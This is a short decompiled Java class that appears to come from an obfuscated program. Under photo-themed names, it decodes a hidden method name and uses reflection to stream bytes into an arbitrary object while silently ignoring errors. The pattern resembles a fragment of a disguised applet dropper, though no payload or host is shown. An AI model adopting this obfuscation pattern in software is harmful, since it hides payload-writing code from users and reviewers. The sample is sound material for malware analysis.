// 
// Decompiled by Procyon v0.5.30
// 

package photo;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.beans.Expression;

public class Mover extends Expression
{
    public static int c;
    public static byte[] b;
    
    public static void gs(final InputStream inputStream, final Object o) {
        Method method = null;
        final String dada = h.dada("GC[@P");
        try {
            method = o.getClass().getMethod(dada, Mover.b.getClass(), Integer.TYPE, Integer.TYPE);
        }
        catch (Exception ex) {}
        try {
            while ((Mover.c = inputStream.read(Mover.b, 0, 4096)) != -1 && Zoom.crop(method, o, new Object[] { Mover.b, 0, Mover.c })) {}
        }
        catch (Exception ex2) {}
    }
    
    public Mover(final Object o, final String s, final Object[] array) {
        super(o, s, array);
    }
    
    static {
        Mover.b = new byte[4096];
    }
}
